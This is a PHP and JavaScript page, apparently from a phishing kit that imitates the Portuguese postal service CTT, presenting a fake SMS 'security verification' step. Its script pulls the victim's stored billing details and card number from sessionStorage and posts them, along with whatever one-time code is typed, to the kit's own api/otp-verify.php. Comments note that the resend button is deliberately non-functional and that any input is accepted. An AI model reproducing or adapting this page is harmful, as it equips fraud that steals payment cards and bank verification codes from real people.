<?php
session_start();
require_once 'includes/header.php';
?>

<div class="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
    <div class="bg-white shadow-lg border-0 rounded-lg overflow-hidden">
        <div class="p-8">
            <!-- Form Header -->
            <div class="flex items-center mb-8">
                <svg class="w-5 h-5 text-red-600 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
                </svg>
                <h2 class="text-xl font-semibold text-gray-900">
                    Verificação de Segurança
                </h2>
            </div>

            <!-- Info Card -->
            <div class="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6">
                <div class="flex">
                    <div class="flex-shrink-0">
                        <svg class="h-5 w-5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0712 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
                        </svg>
                    </div>
                    <div class="ml-3">
                        <p class="text-sm text-blue-700">
                            <strong>Código de verificação enviado!</strong><br />
                            Foi enviado um código de 6 dígitos via SMS para o seu número de telemóvel.
                        </p>
                    </div>
                </div>
            </div>

            <!-- Customer Info -->
            <div class="bg-gray-50 rounded-lg p-4 mb-6">
                <h3 class="font-semibold text-gray-900 mb-2">Dados da verificação:</h3>
                <p class="text-sm text-gray-700" id="customerName">
                    <!-- Will be populated by JavaScript -->
                </p>
                <p class="text-sm text-gray-600" id="customerPhone">
                    <!-- Will be populated by JavaScript -->
                </p>
            </div>

            <!-- OTP Input -->
            <form id="otpForm">
                <div class="space-y-4">
                    <div class="space-y-2">
                        <label for="otp" class="text-sm font-medium text-gray-700">
                            Código de verificação <span class="text-red-500">*</span>
                        </label>
                        <input
                            id="otp"
                            name="otp"
                            type="text"
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500 text-center tracking-widest"
                            placeholder="Insira o código recebido por SMS"
                        />
                    </div>

                    <!-- Resend Button - Non-functional as requested -->
                    <div class="text-center">
                        <button
                            type="button"
                            id="resendBtn"
                            class="text-red-600 hover:text-red-700 text-sm"
                        >
                            <span id="resendText">Reenviar código SMS</span>
                            <span id="resendLoading" class="hidden">
                                <svg class="w-4 h-4 mr-2 animate-spin inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
                                </svg>
                                Reenviando...
                            </span>
                        </button>
                    </div>
                </div>

                <!-- Submit Button - No validation, accept any input -->
                <div class="mt-8 flex justify-end">
                    <button
                        type="submit"
                        id="submitBtn"
                        class="px-8 py-2 rounded-md font-medium transition-colors duration-200 bg-red-600 hover:bg-red-700 text-white"
                    >
                        <span id="btnText">Enviar Código</span>
                        <span id="btnLoading" class="hidden">
                            <svg class="animate-spin -ml-1 mr-3 h-4 w-4 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 714 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                            </svg>
                            Verificando...
                        </span>
                    </button>
                </div>
            </form>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // Load billing and card data from sessionStorage
    const billingData = JSON.parse(sessionStorage.getItem('ctt_billing_data') || '{}');
    const cardData = JSON.parse(sessionStorage.getItem('ctt_card_data') || '{}');
    
    if (!billingData.nome || !cardData.numeroCartao) {
        // If no data, redirect to billing page
        console.log('No billing or card data found, redirecting to billing page');
        window.location.href = 'billing.php';
        return;
    }
    
    console.log('Loaded billing data:', billingData);
    console.log('Loaded card data:', cardData);
    
    // Format phone number for display
    function formatPhoneNumber(phone) {
        if (!phone) return '';
        const cleaned = phone.replace('+351', '').trim();
        if (cleaned.length >= 3) {
            return '•••••' + cleaned.slice(-3);
        }
        return phone;
    }
    
    // Populate customer info
    document.getElementById('customerName').innerHTML = `<strong>${billingData.nome}</strong>`;
    document.getElementById('customerPhone').innerHTML = `SMS enviado para: ${formatPhoneNumber(billingData.telefone)}`;
    
    // Resend button - does nothing but shows visual feedback
    document.getElementById('resendBtn').addEventListener('click', function() {
        const resendText = document.getElementById('resendText');
        const resendLoading = document.getElementById('resendLoading');
        
        console.log('Resend button clicked (non-functional)');
        
        // Show loading for 2 seconds then stop
        resendText.classList.add('hidden');
        resendLoading.classList.remove('hidden');
        this.disabled = true;
        
        setTimeout(() => {
            resendText.classList.remove('hidden');
            resendLoading.classList.add('hidden');
            this.disabled = false;
        }, 2000);
    });
    
    // Form submission - no validation, accept any text
    const form = document.getElementById('otpForm');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const btnLoading = document.getElementById('btnLoading');
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const otpCode = document.getElementById('otp').value; // Accept any text
        
        console.log('Submitting OTP:', otpCode);
        console.log('Billing data:', billingData);
        console.log('Card data:', cardData);
        
        // Show loading state
        submitBtn.disabled = true;
        submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
        submitBtn.classList.remove('bg-red-600', 'hover:bg-red-700');
        btnText.classList.add('hidden');
        btnLoading.classList.remove('hidden');
        
        try {
            const response = await fetch('api/otp-verify.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    otp_code: otpCode,
                    billing_data: billingData,
                    card_data: cardData
                })
            });
            
            console.log('Response status:', response.status);
            
            const result = await response.json();
            console.log('Response data:', result);
            
            if (result.status === 'success') {
                // Store verification status and tracking number
                sessionStorage.setItem('ctt_otp_verified', 'true');
                sessionStorage.setItem('ctt_tracking_number', result.tracking_number);
                
                console.log('Success! Navigating to confirmation...');
                
                // Navigate to confirmation page
                window.location.href = 'confirmation.php';
            } else {
                alert('Erro: ' + result.message);
                console.error('API Error:', result);
            }
        } catch (error) {
            console.error('Fetch Error:', error);
            alert('Erro ao verificar código. Tente novamente.');
        } finally {
            // Reset loading state
            submitBtn.disabled = false;
            submitBtn.classList.remove('bg-gray-400', 'cursor-not-allowed');
            submitBtn.classList.add('bg-red-600', 'hover:bg-red-700');
            btnText.classList.remove('hidden');
            btnLoading.classList.add('hidden');
        }
    });
});
</script>

<?php require_once 'includes/footer.php'; ?>